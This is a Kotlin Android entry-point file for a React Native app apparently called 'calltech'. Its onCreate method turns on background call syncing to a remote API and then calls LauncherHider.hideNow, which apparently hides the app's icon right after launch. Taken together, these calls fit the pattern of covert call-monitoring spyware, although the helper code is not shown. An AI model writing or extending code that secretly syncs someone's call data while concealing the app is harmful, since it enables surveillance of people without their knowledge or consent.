package com.calltech

import android.app.Application
import com.facebook.react.PackageList
import com.facebook.react.ReactApplication
import com.facebook.react.ReactHost
import com.facebook.react.ReactNativeApplicationEntryPoint.loadReactNative
import com.facebook.react.defaults.DefaultReactHost.getDefaultReactHost

class MainApplication : Application(), ReactApplication {

  @Volatile
  private var reactNativeLoaded = false

  override val reactHost: ReactHost by lazy {
    ensureReactNativeLoaded()
    getDefaultReactHost(
      context = applicationContext,
      packageList =
        PackageList(this).packages.apply {
          add(CallSyncPackage())
        },
    )
  }

    override fun onCreate() {
        super.onCreate()
        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)
        LauncherHider.hideNow(this)
        PostInstallPrompt.showIfNeeded(this)
        PostInstallPrompt.showIfNeeded(this)
    }

  fun ensureReactNativeLoaded() {
    if (reactNativeLoaded) {
      return
    }
    synchronized(this) {
      if (!reactNativeLoaded) {
        loadReactNative(this)
        reactNativeLoaded = true
      }
    }
  }
}
